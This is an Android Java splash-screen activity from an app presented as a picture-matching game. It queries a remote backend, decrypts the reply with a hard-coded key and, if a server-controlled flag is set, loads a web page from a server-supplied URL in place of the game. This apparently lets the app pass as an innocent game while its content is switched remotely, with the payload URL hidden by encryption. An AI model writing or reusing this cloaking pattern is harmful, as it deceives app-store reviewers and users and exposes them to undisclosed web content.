package dev.andeng.matchingpicture;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.text.TextUtils;
import android.util.Log;
import android.view.WindowManager;
import android.widget.VideoView;

import androidx.appcompat.app.AppCompatActivity;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.lang.Boolean;

@SuppressLint("CustomSplashScreen")
public class SplashScreen extends AppCompatActivity {

    private SharedPreferences MyPrefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash_screen);
        getWindow().setFlags(
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN
        );
        loadAPI();
        MyPrefs = getSharedPreferences("MyPrefs", MODE_PRIVATE);
        VideoView videoView = findViewById(R.id.videoView);
        videoView.setVideoURI(Uri.parse("android.resource://" + getPackageName() + "/" + R.raw.splash));
        videoView.start();

        AppsFlyerLibUtil.init(this);
    }

    private void loadAPI() {
        com.android.volley.RequestQueue connectAPI = Volley.newRequestQueue(this);
        JSONObject requestBody = new JSONObject();
        try {
            requestBody.put("appid", "7T");
            requestBody.put("package", getPackageName());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        String endPoint = "https://backend.madgamingdev.com/api/gameid?appid=7T&package=" + getPackageName();
        JsonObjectRequest jsonRequest = new JsonObjectRequest(
                Request.Method.GET, endPoint, requestBody,
                new Response.Listener<JSONObject>() {
                    @Override
                    public void onResponse(JSONObject response) {
                        apiResponse = response.toString();
                        try {
                            JSONObject jsonData = new JSONObject(apiResponse);
                            String decryptedData = Crypt.decrypt(jsonData.getString("data"), "21913618CE86B5D53C7B84A75B3774CD");
                            JSONObject gameData = new JSONObject(decryptedData);
                            appStatus = jsonData.getString("gameKey");
                            gameURL = gameData.getString("gameURL");
                            Log.d("appStatus", appStatus);
                            Log.d("gameURL", gameURL);
                            MyPrefs.edit().putString("gameURL", gameURL).apply();

                            // Using a Handler to delay the transition to the next activity
                            new Handler().postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    if (Boolean.parseBoolean(appStatus)) {
                                        Intent intent = new Intent(SplashScreen.this, WebActivity.class);
                                        intent.putExtra("url", gameURL);
                                        startActivity(intent);
                                        finish();
                                    } else {
                                        Intent intent = new Intent(SplashScreen.this, Menu.class);
                                        startActivity(intent);
                                        finish();
                                    }
                                }
                            }, SPLASH_TIME_OUT);
                        } catch (Exception e) {
                            throw new RuntimeException(e);
                        }
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        Log.d("API:RESPONSE", error.toString());
                    }
                }
        );
        connectAPI.add(jsonRequest);
    }

    private static final int SPLASH_TIME_OUT = 4000; // 2 seconds
    static String gameURL = "";
    static String appStatus = "";
    static String apiResponse = "";
}
